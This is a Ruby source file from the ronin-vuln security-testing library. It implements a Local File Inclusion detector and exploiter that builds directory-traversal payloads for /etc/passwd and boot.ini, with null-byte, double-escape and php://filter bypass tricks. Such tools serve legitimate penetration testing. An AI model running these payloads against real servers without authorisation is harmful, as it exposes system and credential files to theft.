#
# ronin-vuln - A Ruby library for blind vulnerability testing.
#
# Copyright (c) 2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vuln is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vuln is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vuln.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/vulns/web_vuln'
require 'ronin/vulns/lfi/test_file'

require 'ronin/support/text/patterns'
require 'ronin/support/crypto'
require 'ronin/support/compression'
require 'uri/query_params'
require 'base64'

module Ronin
  module Vulns
    #
    # Represents a Local File Inclusion (LFI) vulnerability.
    #
    # ## Features
    #
    # * Supports UNIX and Windows paths.
    # * Supports `%00` null terminator trick (fixed in PHP 5.3).
    # * Supports Base64, ROT13, and Zlib `php://filter/`s.
    #
    class LFI < WebVuln

      include Ronin::Support

      # The test file for UNIX systems.
      UNIX_TEST_FILE = TestFile.new('/etc/passwd', %r{(?:[a-z][a-z0-9_-]*:x:\d+:\d+:[^:]*:(?:/[A-Za-z0-9_-]*)+:(?:/[A-Za-z0-9_-]*)+\n)+})

      # The test file for Windows systems.
      WINDOWS_TEST_FILE = TestFile.new('boot.ini', /\[boot loader\](?:\r?\n(?:[^\[\r\n].*)?)*\r?\n(?:\[operating system\](?:\r?\n(?:[^\[\r\n].*)?)*\r?\n)?/m)

      # The default directory traversal depth.
      DEFAULT_DEPTH = 6

      # Targeted Operating System (OS)
      #
      # @return [:unix, :windows, nil]
      attr_reader :os

      # Optional filter bypass technique to use.
      # 
      # @return [:null_byte, :base64, :rot13, :zlib, nil]
      attr_reader :filter_bypass

      # The number of directories to traverse up
      #
      # @return [Integer]
      attr_reader :depth

      # The directory separator character.
      #
      # @return [String]
      attr_reader :separator

      # The escape path to add to every LFI path
      #
      # @return [String]
      attr_reader :escape_path

      # The common file to test with.
      #
      # @return [TestFile]
      attr_reader :test_file

      #
      # Creates a new LFI object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to exploit.
      #
      # @param [:unix, :windows, nil] os
      #   Operating System to specifically target.
      #
      # @param [Integer] depth
      #   Number of directories to escape up.
      #
      # @param [:null_byte, :double_escape, :base64, :rot13, :zlib, nil] filter_bypass
      #   Specifies which filter bypass technique to use.
      #
      #   * `:null_byte - appends a `%00` null byte to the escaped path.
      #     **Note:* this technique only works on PHP < 5.3.
      #   * `:double_escape` - Double escapes the {#escape_path}
      #     (ex: `....//....//`).
      #   * `:base64` - Base64 encodes the included local file.
      #   * `:rot13` - ROT13 encodes the included local file.
      #   * `:zlib` - Zlib compresses and Base64 encodes the included local
      #     file.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {WebVuln#initialize}.
      #
      def initialize(url, os:            :unix,
                          depth:         DEFAULT_DEPTH,
                          filter_bypass: nil,
                          **kwargs)
        super(url,**kwargs)

        @os = os

        case @os
        when :unix
          @separator = '/'
          @test_file = UNIX_TEST_FILE
        when :windows
          @separator = '\\'
          @test_file = WINDOWS_TEST_FILE
        else
          raise(ArgumentError,"unknown os keyword value (#{@os.inspect}) must be either :unix or :windows")
        end

        case filter_bypass
        when :null_byte, :double_escape, :base64, :rot13, :zlib, nil
          @filter_bypass = filter_bypass
        else
          raise(ArgumentError,"unknown filter_bypass keyword value (#{filter_bypass.inspect}) must be :null_byte, :double_escape, :base64, :rot13, :zlib, or nil")
        end

        @depth       = depth
        @escape_path = ("..#{@separator}" * @depth)

        apply_filter_bypasses
      end

      private

      #
      # Pre-applies additional filter-bypass rules to {#escape_path}.
      #
      def apply_filter_bypasses
        if @filter_bypass == :double_escape
          # HACK: String#gsub interpretes "\\" as a special character in the
          # replace string, so we must use String#gsub with a block.
          @escape_path.gsub!("..#{@separator}") do
            "....#{@separator}#{@separator}"
          end
        end
      end

      public

      #
      # Escapes the given path.
      #
      # @param [String] path
      #   The given path to escape.
      #
      # @return [String]
      #   The escaped path.
      #
      # @note
      #   Relative paths and absolute Windows paths to other drives will not
      #   be escaped.
      #
      def escape(path)
        if @os == :windows && path.start_with?('C:\\')
          # escape absolute Windows paths to the C: drive
          "#{@escape_path}#{path[3..]}"
        elsif @os == :windows && path =~ /\A[A-Z]:/
          # pass through absolute Windows paths to other drives
            path
        elsif path.start_with?(@separator)
          # escape absolute paths
          "#{@escape_path}#{path[1..]}"
        else
          # pass through relative paths
          path
        end
      end

      #
      # Builds a `../../..` escaped path for the given file path.
      #
      # @param [String] path
      #   The path to escape.
      #
      # @return [String]
      #   The `../../../` escaped path.
      #
      # @note
      #   * If the given path begins with `php:`, then no `../../../` prefix
      #     will be added.
      #   * If initialized with `filter_bypass: :null_byte`, then a `\0`
      #     character will be appended to the path.
      #
      def encode_payload(path)
        case @filter_bypass
        when :base64
          "php://filter/convert.base64-encode/resource=#{path}"
        when :rot13
          "php://filter/read=string.rot13/resource=#{path}"
        when :zlib
          "php://filter/zlib.deflate/convert.base64-encode/resource=#{path}"
        when :null_byte
          "#{escape(path)}\0"
        else
          escape(path)
        end
      end

      #
      # Exploits the Local File Inclusion (LFI) vulnerability by performing an
      # HTTP request that attempts to include the local file.
      #
      # @param [String] path
      #   The local file path to include.
      #
      # @return [Net::HTTPResponse]
      #   The HTTP response for the LFI request.
      #
      def exploit(path,**kwargs)
        super(encode_payload(path),**kwargs)
      end

      #
      # Determines whether the URL is vulnerable to Local File Inclusion (LFI).
      #
      # @return [Boolean]
      #
      def vulnerable?
        response = exploit(@test_file.path)
        body     = response.body

        case @filter_bypass
        when :base64
          body.scan(Text::Patterns::BASE64).any? do |string|
            Base64.decode64(string) =~ @test_file
          end
        when :rot13
          Crypto.rot(body,-13) =~ @test_file
        when :zlib
          body.scan(Text::Patterns::BASE64).any? do |string|
            begin
              Compression.zlib_inflate(Base64.decode64(string)) =~ @test_file
            rescue Zlib::DataError
            end
          end
        else
          body =~ @test_file
        end
      end

    end
  end
end
